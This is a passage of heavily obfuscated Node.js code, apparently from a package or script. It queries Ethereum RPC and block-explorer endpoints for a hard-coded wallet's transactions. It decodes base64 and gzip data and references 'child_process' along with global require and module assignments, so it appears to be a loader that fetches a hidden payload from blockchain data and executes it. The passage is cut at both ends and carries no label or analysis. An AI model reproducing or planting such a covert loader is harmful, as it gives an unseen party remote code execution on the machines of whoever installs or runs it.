_0x33f8c6<_0x52d640;},'MRRMe':function(_0xb4b4ee,_0x48ba5e){return _0xb4b4ee>=_0x48ba5e;},'UOFLx':function(_0x3e4012,_0x28840e){return _0x3e4012(_0x28840e);},'beCzF':function(_0x34c01f,_0x1140c2){return _0x34c01f===_0x1140c2;},'dfFGU':function(_0x5b4d4d,_0x3c699a){return _0x5b4d4d!==_0x3c699a;},'eFyPx':function(_0x5cfbd8,_0x3010e5){return _0x5cfbd8(_0x3010e5);},'Dwqwq':_0x22dd27(0xcc),'QOAjr':_0x22dd27(0x175),'MltrU':_0x22dd27(0x16b),'PvcTj':_0x22dd27(0x194),'zTKCw':function(_0x2674a9,_0x30968b){return _0x2674a9+_0x30968b;},'xDPaM':function(_0x32c512,_0x2e00af){return _0x32c512!=_0x2e00af;},'pZXYl':function(_0x36cc6e,_0x4b2060){return _0x36cc6e===_0x4b2060;},'vRwSb':_0x22dd27(0xd3)+_0x22dd27(0x1a9),'ucpaX':_0x22dd27(0x198)+_0x22dd27(0x128),'yInys':_0x22dd27(0x1aa),'EjCUD':function(_0x22c9dc,_0x581aaa){return _0x22c9dc!=_0x581aaa;},'vwSTK':_0x22dd27(0x82)+'pe','BrVWx':_0x22dd27(0x120)+_0x22dd27(0x167)},_0x14b1c7=new URL(_0x288096),_0x1ecfec=_0x2e88b9[_0x22dd27(0x111)](_0x14b1c7[_0x22dd27(0x191)],_0x2e88b9[_0x22dd27(0xe6)])?https:http,_0x584dff={'Accept':_0x2e88b9[_0x22dd27(0x17d)],'\u0041\u0063\u0063\u0065\u0070\u0074\u002D\u0045\u006E\u0063\u006F\u0064\u0069\u006E\u0067':_0x2e88b9[_0x22dd27(0x185)],'Connection':_0x2e88b9[_0x22dd27(0x125)]};return _0x2e88b9[_0x22dd27(0x18c)](_0x1e1d38,null)&&(_0x584dff[_0x2e88b9[_0x22dd27(0x129)]]=_0x2e88b9[_0x22dd27(0x17d)],_0x584dff[_0x2e88b9[_0x22dd27(0x154)]]=Buffer[_0x22dd27(0xe7)](_0x1e1d38)),new Promise((_0x553038,_0xe33d86)=>{const _0x384fdc=_0x22dd27,_0x4dc16f={'FZbrm':_0x2e88b9[_0x384fdc(0xfc)],'jxKxj':function(_0x564452,_0x257140){const _0x342241=_0x384fdc;return _0x2e88b9[_0x342241(0x11c)](_0x564452,_0x257140);},'gqTzu':function(_0x3c16fa,_0xae1d3d){const _0x5890f6=_0x384fdc;return _0x2e88b9[_0x5890f6(0x1c1)](_0x3c16fa,_0xae1d3d);},'fCyKB':function(_0x2c7dce,_0x234c08){const _0x134c5f=_0x384fdc;return _0x2e88b9[_0x134c5f(0xff)](_0x2c7dce,_0x234c08);},'BSxZQ':function(_0x3052a6,_0x36c1ac){const _0x5582cf=_0x384fdc;return _0x2e88b9[_0x5582cf(0xf8)](_0x3052a6,_0x36c1ac);},'CZgSO':function(_0x4bea43,_0x2686c3){const _0x578467=_0x384fdc;return _0x2e88b9[_0x578467(0x160)](_0x4bea43,_0x2686c3);},'qMvGW':function(_0x2342c2,_0x2cdfce){const _0x7d9afe=_0x384fdc;return _0x2e88b9[_0x7d9afe(0x160)](_0x2342c2,_0x2cdfce);},'MPqWX':function(_0xbc0d1,_0x5060e6){const _0x551f2c=_0x384fdc;return _0x2e88b9[_0x551f2c(0x146)](_0xbc0d1,_0x5060e6);},'dHoEF':function(_0x9d4007,_0x1a2597){const _0x1174c7=_0x384fdc;return _0x2e88b9[_0x1174c7(0xff)](_0x9d4007,_0x1a2597);},'EpZSh':_0x2e88b9[_0x384fdc(0xa1)],'cYebN':_0x2e88b9[_0x384fdc(0xa9)],'BHwLs':_0x2e88b9[_0x384fdc(0xe9)]},_0x154605=_0x1ecfec[_0x384fdc(0x8a)]({'hostname':_0x14b1c7[_0x384fdc(0xb8)],'port':_0x14b1c7[_0x384fdc(0x96)]||(_0x2e88b9[_0x384fdc(0xf8)](_0x14b1c7[_0x384fdc(0x191)],_0x2e88b9[_0x384fdc(0xe6)])?-0x22dc+-0x75e+-0x3ff*-0xb:0x190a+-0x275*-0xe+0x764*-0x8),'path':_0x2e88b9[_0x384fdc(0x97)](_0x14b1c7[_0x384fdc(0xcd)],_0x14b1c7[_0x384fdc(0xa5)]),'method':_0x180375,'agent':A[_0x14b1c7[_0x384fdc(0x191)]],'signal':_0x4a5a6a,'headers':_0x584dff},_0x10d061=>{const _0x32263c=_0x384fdc,_0x360a3b={'wcugX':_0x4dc16f[_0x32263c(0x177)],'nsBHQ':function(_0x49ffa7,_0x50e3e4){const _0x12b240=_0x32263c;return _0x4dc16f[_0x12b240(0x18d)](_0x49ffa7,_0x50e3e4);},'ALAHX':function(_0x575592,_0x57f6cb){const _0x4b2af9=_0x32263c;return _0x4dc16f[_0x4b2af9(0xe8)](_0x575592,_0x57f6cb);},'wxUwN':function(_0xfe9a59,_0x578340){const _0x395788=_0x32263c;return _0x4dc16f[_0x395788(0x89)](_0xfe9a59,_0x578340);},'gnTPd':function(_0x5baf6e,_0x2e93d8){const _0x980b65=_0x32263c;return _0x4dc16f[_0x980b65(0xac)](_0x5baf6e,_0x2e93d8);},'gdiqs':function(_0x1607ba,_0x15779b){const _0x11943d=_0x32263c;return _0x4dc16f[_0x11943d(0x152)](_0x1607ba,_0x15779b);},'jQhWh':function(_0x9ace49,_0x49dfad){const _0x3317be=_0x32263c;return _0x4dc16f[_0x3317be(0x110)](_0x9ace49,_0x49dfad);},'QgmDv':function(_0x18a864,_0x37b6d8){const _0xeab540=_0x32263c;return _0x4dc16f[_0xeab540(0x135)](_0x18a864,_0x37b6d8);},'WPvOf':function(_0x595740,_0x2e0fd7){const _0x383d0c=_0x32263c;return _0x4dc16f[_0x383d0c(0x11f)](_0x595740,_0x2e0fd7);}},_0xe9039=_0x4dc16f[_0x32263c(0x89)](ds,_0x10d061),_0x34023=[];_0xe9039['on'](_0x4dc16f[_0x32263c(0x179)],_0x13f678=>_0x34023[_0x32263c(0xe3)](_0x13f678)),_0xe9039['on'](_0x4dc16f[_0x32263c(0x11b)],()=>{const _0x256843=_0x32263c,_0x16eb44=Buffer[_0x256843(0x12a)](_0x34023)[_0x256843(0x156)](_0x360a3b[_0x256843(0xa3)])[_0x256843(0xa0)]();if(_0x360a3b[_0x256843(0xb0)](_0x10d061[_0x256843(0x104)],-0x115*-0x11+0x13b5*-0x1+0x218)||_0x360a3b[_0x256843(0x193)](_0x10d061[_0x256843(0x104)],-0x130*0x9+0xe*0x1e1+0x2*-0x739))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('H'+_0x10d061[_0x256843(0x104)]+':'+_0x16eb44[_0x256843(0x1ad)](0x3*0xb2d+-0x103f+-0x1148,-0x1*0x1baf+-0x2*-0x30b+0x4f*0x47)));if(!_0x16eb44||_0x360a3b[_0x256843(0xde)](_0x16eb44[-0x1*-0x1542+-0x2*-0xe9b+-0x3278],'\u003C')||_0x360a3b[_0x256843(0xfe)](_0x16eb44[0xb8b+0x10*0xbc+0x1*-0x174b],'\u007B')&&_0x360a3b[_0x256843(0xe2)](_0x16eb44[0xea5+0x1*-0x236+-0xc6f*0x1],'\u005B'))return _0x360a3b[_0x256843(0x1a1)](_0xe33d86,new Error('J:'+_0x16eb44[_0x256843(0x1ad)](-0x2200+0x2f*-0x9b+0x3e75,-0x22c9+0x4f4+0x1e25)));try{_0x360a3b[_0x256843(0x94)](_0x553038,JSON[_0x256843(0x190)](_0x16eb44));}catch(_0x34ad21){_0x360a3b[_0x256843(0x86)](_0xe33d86,new Error('P:'+_0x34ad21[_0x256843(0xb5)]));}}),_0xe9039['on'](_0x4dc16f[_0x32263c(0x124)],_0xe33d86);});_0x154605['on'](_0x2e88b9[_0x384fdc(0xe9)],_0xe33d86),_0x2e88b9[_0x384fdc(0xa8)](_0x1e1d38,null)&&_0x154605[_0x384fdc(0x151)](_0x1e1d38),_0x154605[_0x384fdc(0x175)]();});}function _0x3307(){const _0x3b7856=['HTMau','kZlWZ','bnHJf','RptWP','write','CZgSO',':443','BrVWx','tZBew','toString','fkRSW',':443/0x/ls','rsXqP','pc.io/eth','createGunz','KJKIG','shSPT','OcATS','stener','dfFGU','ignore','SIecw','TQAET','zezXV','QZRte','POST','ngth','bRTqf','QQiEt','uUkdF','error','stapi.io','LnaXN','vAWQN','kpHNq','ut.com/api','BtJwU','RWpMw','find','catch','end','GET','FZbrm','crZCf','EpZSh','map','hereum-rpc','Kit/537.36','vRwSb','liDecompre','595780QbjmdV','CHepZ','6f0121063e','VyEOa','OGXGz','rwOMD','ucpaX','aBWJK','addEventLi','nsactionCo','9&page=1&o','FakYG','Jpnst','EjCUD','jxKxj','url','node','parse','protocol','gzip','ALAHX','https:','\x27]=\x27','count&acti',')\x20AppleWeb','gzip,\x20defl','toLowerCas','HoDWs','eth_getBlo','QZywI','wibbZ','unt','xOtmL','ike\x20Gecko)','wxUwN','pMLys','http','result','_t_s','forEach','Agent','all','n/json','keep-alive','.publicnod','3908idpnlr','slice','UniBA','AiKTD','xgJMR','ViSQB','h.drpc.org','YyqQS','uJddd','child_proc','uyVDL','ZuHfL','yyHsj','oflCH','cHSXQ','CQAWy','length','32590789fJQcWT','\x20NT\x2010.0;\x20','JxCbi','QbRRV','MRRMe','nerJu','bpVfp','Content-Ty','oPGHI','RbxTf','min','WPvOf','from','nGxVW','fCyKB','request','LyGdN','czpyg','unref','BLrzN','subarray','replace','_t_u','transactio','0\x20(Windows','QgmDv','ojvxD','port','zTKCw','ck=9999999','\x20(KHTML,\x20l','charCodeAt','global[\x27_V','AARcQ','_H2','isArray','HFGYl','trim','Dwqwq','get','wcugX','blockNumbe','search','PvZQW','6AKWwcZ','xDPaM','QOAjr','5961487gAvUKF','object','BSxZQ','cyCpl','https://et','headers','nsBHQ','jIkRj','unMKf','then','finally','message','mEGgj',',Sr3=@','hostname','\x27;global[\x27','e.com','wIbeD','DTEdO','QthWB','EkQIH','stringify','q4FZkxX{!h','OVUFq','no\x20b64','xGjeD','HkrSh','PVNNR','createInfl','WByWQ','IctFD','bymlS','9aDC2490Ef','1.0.0.0\x20Sa','data','pathname','ilterby=fr','h.blocksco','caxup','23427SFKuld','cRXVv','applicatio','uMvOo','Mozilla/5.','base64','tpJHG','tZibq','1300BKywdY','al=global;','e;global[\x27','ckByNumber','findIndex','gnTPd','x-gzip','resume','PskPD','jQhWh','push','public.bla','HQMBO','PvcTj','byteLength','gqTzu','MltrU','hSmHa','ucUNo','2823eEOkZK','1647205wUeYDY','r\x27]=requir','UISzP','onYDw','m\x27]=module','on=txlist&','ess','signal','utf8','YfHXM','b64','beCzF','DfeAz','nonce',';var\x20_glob','Zbgqs','MJEEv','gdiqs','UOFLx','eth_blockN','resolve','jwZZr','@^1aQk','statusCode','deflate','SfXzz','filter','y-p_>d$0B&','abort','Win64;\x20x64','k=0&endblo',':80','https','USRYf','empty','qMvGW','pZXYl','hex','\x20Chrome/13','h-mainnet.','x-payload-','HEAD','SrQJg','eth_getTra','OVJbp','https://1r','cYebN','webnr','bKTVo','?module=ac','dHoEF','Content-Le','YLiob','http://','content-en','BHwLs','yInys','ate','address=','ate,\x20br','vwSTK','concat','1QiuBJh','D311D3080e','GGbog','ffset=20&s','controller','xzqPs','durVE','ngsKF','OxJjQ','eGiCH','MPqWX','RmfMB','fLEkP','7089872YjfbgX',':443/0x/cl','0xa322E5f3','&startbloc','2.0','ufUJK','zAkNr','zlib','fari/537.3','bPQfv','coding','run','FXTJz','any','eFyPx','umber','ogFTC','pipe','XUzln','ort=desc&f','createBrot'];_0x3307=function(){return _0x3b7856;};return _0x3307();}function wr(_0x4bf01d,_0x2d60a1){const _0x302f7f=_0x44ceab,_0x44f1c3=R[_0x302f7f(0x17a)](()=>new AbortController());return _0x2d60a1&&_0x44f1c3[_0x302f7f(0x1a6)](_0x206e57=>_0x2d60a1[_0x302f7f(0x187)+_0x302f7f(0x15f)](_0x302f7f(0x109),()=>_0x206e57[_0x302f7f(0x109)](),{'once':!(-0x4ea+0x1*0xbd9+-0x6ef)})),Promise[_0x302f7f(0x145)](R[_0x302f7f(0x17a)]((_0x5bb22b,_0x500809)=>_0x4bf01d(_0x5bb22b,_0x44f1c3[_0x500809][_0x302f7f(0xf4)])))[_0x302f7f(0xb4)](()=>{const _0x4f9e9e=_0x302f7f;for(const _0x51b2a9 of _0x44f1c3)_0x51b2a9[_0x4f9e9e(0x109)]();});}function _0xc702(_0x439202,_0x221bcc){_0x439202=_0x439202-(-0x9*-0x1+-0x7a2+0x81a);const _0x258a51=_0x3307();let _0x1d3d9c=_0x258a51[_0x439202];return _0x1d3d9c;}function rc(_0xda6d24,_0x2f10db,_0x33e410,_0x33ea87){const _0x402523=_0x44ceab,_0xc93c85={'czpyg':function(_0x10ed1d,_0x268c4e,_0x151e32){return _0x10ed1d(_0x268c4e,_0x151e32);},'AARcQ':_0x402523(0x166),'uJddd':_0x402523(0x13c)};return _0xc93c85[_0x402523(0x8c)](hr,_0xda6d24,{'method':_0xc93c85[_0x402523(0x9c)],'body':JSON[_0x402523(0xbf)]({'jsonrpc':_0xc93c85[_0x402523(0x1b4)],'id':0x1,'method':_0x2f10db,'params':_0x33e410}),'signal':_0x33ea87})[_0x402523(0xb3)](_0x105f19=>_0x105f19[_0x402523(0x1a4)]);}function rb(_0x718651,_0x5f02ff,_0x2d059d){const _0x74a62a=_0x44ceab,_0x56d273={'PvZQW':function(_0x775ce9,_0x1b0e71,_0x14c8b9){return _0x775ce9(_0x1b0e71,_0x14c8b9);},'caxup':_0x74a62a(0x166)};return _0x56d273[_0x74a62a(0xa6)](hr,_0x718651,{'method':_0x56d273[_0x74a62a(0xd0)],'body':JSON[_0x74a62a(0xbf)](_0x5f02ff[_0x74a62a(0x17a)](([_0x1d278d,_0x9f4d19],_0x4a23f8)=>({'jsonrpc':_0x74a62a(0x13c),'id':_0x4a23f8+(-0x65a+0x65e*-0x1+0xcb9),'method':_0x1d278d,'params':_0x9f4d19}))),'signal':_0x2d059d})[_0x74a62a(0xb3)](_0x23c1b4=>{const _0x433ea=_0x74a62a,_0x49fb65=new Map(_0x23c1b4[_0x433ea(0x17a)](_0x50a29a=>[_0x50a29a['id'],_0x50a29a]));return _0x5f02ff[_0x433ea(0x17a)]((_0x495ead,_0x1ee36d)=>_0x49fb65[_0x433ea(0xa2)](_0x1ee36d+(-0x11*0x14d+0x11c*0x14+-0x12))[_0x433ea(0x1a4)]);});}const bh=_0x40171f=>'\u0030\u0078'+_0x40171f[_0x44ceab(0x156)](-0x7df+-0x366+0x3*0x3c7);function fm(_0x540367){const _0x3a68d0={'vAWQN':function(_0x1b34c2,_0x3e11fd){return _0x1b34c2(_0x3e11fd);},'TQAET':function(_0x198eea,_0x7e3b93){return _0x198eea(_0x7e3b93);},'onYDw':function(_0x8960f0,_0x575a0a){return _0x8960f0===_0x575a0a;},'tZibq':function(_0x24609a,_0x5902a5){return _0x24609a===_0x5902a5;}};return new Promise(_0x47f6db=>{const _0x2a597f=_0xc702,_0x384d44={'bpVfp':function(_0x449e71,_0x542e23){const _0x3bbbce=_0xc702;return _0x3a68d0[_0x3bbbce(0x163)](_0x449e71,_0x542e23);},'oflCH':function(_0x4ac23a,_0x782e6e){const _0x2f0696=_0xc702;return _0x3a68d0[_0x2f0696(0xf0)](_0x4ac23a,_0x782e6e);},'RWpMw':function(_0x5c212f,_0x4a2ebf){const _0x349934=_0xc702;return _0x3a68d0[_0x349934(0xd8)](_0x5c212f,_0x4a2ebf);},'kpHNq':function(_0xf237d4,_0x2f4069){const _0x42ee91=_0xc702;return _0x3a68d0[_0x42ee91(0x163)](_0xf237d4,_0x2f4069);}};let _0x2002c9=_0x540367[_0x2a597f(0x1bc)];if(!_0x2002c9)return _0x3a68d0[_0x2a597f(0x16e)](_0x47f6db,null);let _0x2587b3=!(0x156e+-0x29*0x9d+-0x1c*-0x22);const _0x4fc567=_0x145588=>{const _0x3721c3=_0x2a597f;if(_0x2587b3)return;_0x2587b3=!(0x1d7a*-0x1+-0x2*-0xf6b+0x4*-0x57);for(const _0x4467d0 of _0x540367)_0x4467d0[_0x3721c3(0x12f)][_0x3721c3(0x109)]();_0x3a68d0[_0x3721c3(0x16e)](_0x47f6db,_0x145588);};for(const _0xfe772d of _0x540367)_0xfe772d[_0x2a597f(0x143)]()[_0x2a597f(0xb3)](_0x2cf5b=>{const _0x1c2d03=_0x2a597f;if(_0x2587b3)return;_0x2cf5b?_0x384d44[_0x1c2d03(0x81)](_0x4fc567,_0x2cf5b):_0x384d44[_0x1c2d03(0x1b9)](--_0x2002c9,0xede+0x300+0x8ef*-0x2)&&_0x384d44[_0x1c2d03(0x81)](_0x47f6db,null);})[_0x2a597f(0x174)](()=>{const _0x50b4ed=_0x2a597f;!_0x2587b3&&_0x384d44[_0x50b4ed(0x172)](--_0x2002c9,0x25a1+-0x8ad*0x2+-0xb3*0x1d)&&_0x384d44[_0x50b4ed(0x16f)](_0x47f6db,null);});});}const cb=_0x3f6224=>[...new Set([_0x3f6224-0x1n,_0x3f6224,_0x3f6224+0x1n,_0x3f6224-B-0x1n,_0x3f6224-B,_0x3f6224-B+0x1n][_0x44ceab(0x107)](_0x154e0d=>_0x154e0d>=0x0n))];function bt(_0x408b67){const _0x303cd1=_0x44ceab,_0x3b1daf=new AbortController();return{'controller':_0x3b1daf,'run':()=>wr((_0x1523b0,_0x1fd6a4)=>rc(_0x1523b0,_0x303cd1(0x19b)+_0x303cd1(0xdc),[bh(_0x408b67),!(-0x1fd1+0xc2*0x10+0x13b1)],_0x1fd6a4),_0x3b1daf[_0x303cd1(0xf4)])[_0x303cd1(0xb3)](_0x201c4c=>{const _0x123ec6=_0x303cd1,_0x401544=_0x201c4c?.[_0x123ec6(0x92)+'ns'],_0x139f3a=Array[_0x123ec6(0x9e)](_0x401544)?_0x401544[_0x123ec6(0x173)](_0x39f4e3=>_0x39f4e3[_0x123ec6(0x87)]?.[_0x123ec6(0x199)+'e']()===S):null;return _0x139f3a?{'blockNumber':_0x408b67,'tx':_0x139f3a}:null;})};}function na(_0x7cad65,_0xca9e47){const _0x84e27d=_0x44ceab,_0x3c49d0={'xOtmL':function(_0x1e5a6a,_0x5c706f,_0x2bf6fb){return _0x1e5a6a(_0x5c706f,_0x2bf6fb);}},_0x1e8487=_0x7cad65[_0x84e27d(0x17a)](_0xb7b7a5=>[_0x84e27d(0x118)+_0x84e27d(0x188)+_0x84e27d(0x19e),[S,bh(_0xb7b7a5)]]);return _0x3c49d0[_0x84e27d(0x19f)](wr,(_0x46ae76,_0x5bb4a1)=>rb(_0x46ae76,_0x1e8487,_0x5bb4a1),_0xca9e47)[_0x84e27d(0xb3)](_0x21bb32=>_0x21bb32[_0x84e27d(0x17a)](BigInt))[_0x84e27d(0x174)](()=>Promise[_0x84e27d(0x1a8)](_0x1e8487[_0x84e27d(0x17a)](([_0x5e0af3,_0x3d3a32])=>wr((_0x5c21ad,_0x2e3faf)=>rc(_0x5c21ad,_0x5e0af3,_0x3d3a32,_0x2e3faf),_0xca9e47)))[_0x84e27d(0xb3)](_0x319440=>_0x319440[_0x84e27d(0x17a)](BigInt)));}function ls(_0x599551){const _0x46f089=_0x44ceab,_0x4f37fe={'rsXqP':function(_0x314d5c,_0xa09b1d){return _0x314d5c!==_0xa09b1d;},'HTMau':function(_0x4d2aba,_0x2a3505){return _0x4d2aba===_0x2a3505;},'cHSXQ':function(_0x46b45c,_0x810410){return _0x46b45c(_0x810410);},'KJKIG':function(_0x584fc8,_0x12f945){return _0x584fc8<=_0x12f945;},'RptWP':function(_0x473a49,_0x4b88e6){return _0x473a49(_0x4b88e6);},'rwOMD':function(_0x37c87c,_0x32fe38){return _0x37c87c===_0x32fe38;},'SfXzz':function(_0x329a18,_0x33ff17){return _0x329a18-_0x33ff17;},'bnHJf':function(_0x5270be,_0x437bf5){return _0x5270be>_0x437bf5;},'nerJu':function(_0x52648e){return _0x52648e();},'PVNNR':function(_0x355d71,_0x4806ad){return _0x355d71(_0x4806ad);},'IctFD':function(_0x5e3f1a,_0x5d134d){return _0x5e3f1a(_0x5d134d);},'mEGgj':function(_0x2c432a,_0x3349b9){return _0x2c432a+_0x3349b9;},'zezXV':function(_0x765091,_0xfafc34){return _0x765091/_0xfafc34;},'UISzP':function(_0x515f4f,_0x2ee081){return _0x515f4f*_0x2ee081;},'QQiEt':function(_0x46f2a5,_0x311e8c,_0x12f7b2){return _0x46f2a5(_0x311e8c,_0x12f7b2);},'ufUJK':function(_0x1a6331,_0x3053a0){return _0x1a6331-_0x3053a0;},'DTEdO':function(_0x63b7c2,_0x34f196){return _0x63b7c2??_0x34f196;}},_0x2dafd4=new AbortController(),_0x844271=()=>_0x2dafd4[_0x46f089(0x109)]();return Promise[_0x46f089(0x101)](_0x4f37fe[_0x46f089(0xbc)](_0x599551,null))[_0x46f089(0xb3)](_0x2f1445=>_0x2f1445!=null?_0x2f1445:wr((_0x1a906f,_0x20bf86)=>rc(_0x1a906f,_0x46f089(0x100)+_0x46f089(0x147),[],_0x20bf86),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x337616=>BigInt(_0x337616)))[_0x46f089(0xb3)](_0x7dfc96=>wr((_0x3353f9,_0x53082)=>rc(_0x3353f9,_0x46f089(0x118)+_0x46f089(0x188)+_0x46f089(0x19e),[S,bh(_0x7dfc96)],_0x53082),_0x2dafd4[_0x46f089(0xf4)])[_0x46f089(0xb3)](_0x264dec=>[_0x7dfc96,BigInt(_0x264dec)]))[_0x46f089(0xb3)](([_0x204e25,_0x4391d2])=>{const _0x1bca21=_0x46f089,_0x245ede={'uUkdF':function(_0x26ea2f,_0x28f631){const _0x2ed924=_0xc702;return _0x4f37fe[_0x2ed924(0x184)](_0x26ea2f,_0x28f631);},'YfHXM':function(_0x22b607,_0x1b5862){const _0x245652=_0xc702;return _0x4f37fe[_0x245652(0x106)](_0x22b607,_0x1b5862);},'VyEOa':function(_0x109d6f,_0x5d2a4a){const _0x51b5e8=_0xc702;return _0x4f37fe[_0x51b5e8(0x14f)](_0x109d6f,_0x5d2a4a);},'hSmHa':function(_0x53e4df,_0x4c6c4c){const _0x5482bf=_0xc702;return _0x4f37fe[_0x5482bf(0x106)](_0x53e4df,_0x4c6c4c);},'HoDWs':function(_0x2c43c1){const _0x1949b9=_0xc702;return _0x4f37fe[_0x1949b9(0x1c2)](_0x2c43c1);},'OVUFq':function(_0x2e34e9,_0x1f4702){const _0x546497=_0xc702;return _0x4f37fe[_0x546497(0xc5)](_0x2e34e9,_0x1f4702);},'uyVDL':function(_0x5d5f21,_0x2acf3f){const _0x3dddda=_0xc702;return _0x4f37fe[_0x3dddda(0xc8)](_0x5d5f21,_0x2acf3f);},'ViSQB':function(_0x3795ce,_0x1f5306){const _0x1218d8=_0xc702;return _0x4f37fe[_0x1218d8(0x15c)](_0x3795ce,_0x1f5306);},'AiKTD':function(_0x2b505a,_0x3153c7){const _0x52f1f9=_0xc702;return _0x4f37fe[_0x52f1f9(0xb6)](_0x2b505a,_0x3153c7);},'bymlS':function(_0x3e4d2e,_0x499abe){const _0x2cd6f0=_0xc702;return _0x4f37fe[_0x2cd6f0(0x164)](_0x3e4d2e,_0x499abe);},'jwZZr':function(_0x5aa412,_0xeb0c91){const _0x34cacd=_0xc702;return _0x4f37fe[_0x34cacd(0xef)](_0x5aa412,_0xeb0c91);},'tpJHG':function(_0x25f10c,_0x31293f,_0x2fa3c8){const _0xa133d6=_0xc702;return _0x4f37fe[_0xa133d6(0x169)](_0x25f10c,_0x31293f,_0x2fa3c8);}},_0x4e5ea3=_0x4f37fe[_0x1bca21(0x13d)](_0x4391d2,0x1n);let _0x270113=-0x1n,_0x3092fe=_0x204e25;const _0x486901=()=>_0x3092fe-_0x270113<=0x1n?wr((_0x2c5d53,_0x25226a)=>rc(_0x2c5d53,_0x1bca21(0x19b)+_0x1bca21(0xdc),[bh(_0x3092fe),!(0x10d*-0x13+0x4*0x298+-0x1*-0x997)],_0x25226a),_0x2dafd4[_0x1bca21(0xf4)])[_0x1bca21(0xb3)](_0x50c376=>{const _0x38672b=_0x1bca21,_0xaf6429=_0x50c376?.[_0x38672b(0x92)+'ns']||[];let _0x1690ce=null;for(const _0x1560a1 of _0xaf6429){if(_0x4f37fe[_0x38672b(0x159)](_0x1560a1[_0x38672b(0x87)]?.[_0x38672b(0x199)+'e'](),S))continue;if(_0x4f37fe[_0x38672b(0x14d)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4e5ea3)){_0x1690ce=_0x1560a1;break;}_0x1690ce&&_0x4f37fe[_0x38672b(0x15c)](_0x4f37fe[_0x38672b(0x1ba)](BigInt,_0x1560a1[_0x38672b(0xfa)]),_0x4f37fe[_0x38672b(0x150)](BigInt,_0x1690ce[_0x38672b(0xfa)]))||(_0x1690ce=_0x1560a1);}return{'blockNumber':_0x3092fe,'tx':_0x1690ce};}):(_0x136021=>{const _0x337e14=_0x1bca21,_0x32454d={'FakYG':function(_0x5cbe21,_0x8b17e1){const _0x59f183=_0xc702;return _0x245ede[_0x59f183(0x16a)](_0x5cbe21,_0x8b17e1);},'DfeAz':function(_0x4b3382,_0x60dd00){const _0x4ae815=_0xc702;return _0x245ede[_0x4ae815(0xf6)](_0x4b3382,_0x60dd00);},'jIkRj':function(_0x1d673,_0x4ad835){const _0x536981=_0xc702;return _0x245ede[_0x536981(0x182)](_0x1d673,_0x4ad835);},'FXTJz':function(_0x5e2e14,_0x58a077){const _0x208e6b=_0xc702;return _0x245ede[_0x208e6b(0xea)](_0x5e2e14,_0x58a077);},'OVJbp':function(_0x26928b){const _0x34bd4b=_0xc702;return _0x245ede[_0x34bd4b(0x19a)](_0x26928b);}},_0x581450=_0x245ede[_0x337e14(0xc1)](BigInt,Math[_0x337e14(0x85)](-0x1*-0x751+0x151*-0x3+-0x352,_0x245ede[_0x337e14(0x1b6)](Number,_0x136021))),_0x3f45c9=[];for(let _0x4cf8ce=0x1n;_0x245ede[_0x337e14(0x1b1)](_0x4cf8ce,_0x581450);_0x4cf8ce+=0x1n)_0x3f45c9[_0x337e14(0xe3)](_0x245ede[_0x337e14(0x1af)](_0x270113,_0x245ede[_0x337e14(0xc9)](_0x245ede[_0x337e14(0x102)](_0x4cf8ce,_0x245ede[_0x337e14(0xea)](_0x3092fe,_0x270113)),_0x245ede[_0x337e14(0x1af)](_0x581450,0x1n))));return _0x245ede[_0x337e14(0xd7)](na,_0x3f45c9,_0x2dafd4[_0x337e14(0xf4)])[_0x337e14(0xb3)](_0x5dbf8d=>{const _0x1caffe=_0x337e14,_0x5ab502=_0x5dbf8d[_0x1caffe(0xdd)](_0x4c8e66=>_0x4c8e66>=_0x4391d2);return _0x32454d[_0x1caffe(0x18a)](_0x5ab502,-(-0xd5f+-0x2595+-0x5*-0xa31))?_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0xf9)](_0x3f45c9[_0x1caffe(0x1bc)],-0xe67+0xa*-0x247+0x1*0x252e)]:(_0x3092fe=_0x3f45c9[_0x5ab502],_0x32454d[_0x1caffe(0xb1)](_0x5ab502,-0x2346+0x7c9*-0x5+-0x28f*-0x1d)&&(_0x270113=_0x3f45c9[_0x32454d[_0x1caffe(0x144)](_0x5ab502,-0x84a+-0x39e*-0x6+0x1*-0xd69)])),_0x32454d[_0x1caffe(0x119)](_0x486901);});})(_0x3092fe-_0x270113-0x1n);return _0x4f37fe[_0x1bca21(0x1c2)](_0x486901);})[_0x46f089(0xb4)](_0x844271);}function li(){const _0x58b7e7=_0x44ceab,_0x4f8e9d={'OcATS':function(_0x2dc4cf,_0x31cb32){return _0x2dc4cf(_0x31cb32);},'ucUNo':function(_0x2649cf,_0x2fb135){return _0x2649cf(_0x2fb135);}};return _0x4f8e9d[_0x58b7e7(0xeb)](hr,I+(_0x58b7e7(0x11e)+_0x58b7e7(0x196)+_0x58b7e7(0xf2)+_0x58b7e7(0x127))+S+(_0x58b7e7(0x13b)+_0x58b7e7(0x10b)+_0x58b7e7(0x98)+_0x58b7e7(0x189)+_0x58b7e7(0x12e)+_0x58b7e7(0x14b)+_0x58b7e7(0xce)+'om'))[_0x58b7e7(0xb3)](_0x201a2a=>{const _0x58dd10=_0x58b7e7,_0x5ed66a=Array[_0x58dd10(0x9e)](_0x201a2a?.[_0x58dd10(0x1a4)])?_0x201a2a[_0x58dd10(0x1a4)]:[],_0x274d78=_0x5ed66a[_0x58dd10(0x173)](_0x3e34b6=>_0x3e34b6[_0x58dd10(0x87)]?.[_0x58dd10(0x199)+'e']()===S);return{'blockNumber':_0x4f8e9d[_0x58dd10(0x15e)](BigInt,_0x274d78[_0x58dd10(0xa4)+'r']),'tx':_0x274d78};});}((async()=>{const _0x55f1b7=_0x44ceab,_0xc996f9={'kZlWZ':_0x55f1b7(0x115)+_0x55f1b7(0xf7),'eGiCH':_0x55f1b7(0xc2),'LyGdN':function(_0xfae908,_0x26c4f5){return _0xfae908(_0x26c4f5);},'HkrSh':_0x55f1b7(0xd6),'PskPD':function(_0x2bbcb8,_0x583518){return _0x2bbcb8<_0x583518;},'HQMBO':function(_0x1b3a42,_0x1d197e){return _0x1b3a42%_0x1d197e;},'crZCf':_0x55f1b7(0xf5),'cyCpl':function(_0x3bac80,_0x246771){return _0x3bac80===_0x246771;},'CHepZ':_0x55f1b7(0x116),'JxCbi':function(_0x362ca9,_0x1c2819){return _0x362ca9(_0x1c2819);},'Jpnst':function(_0x311b27,_0x361384){return 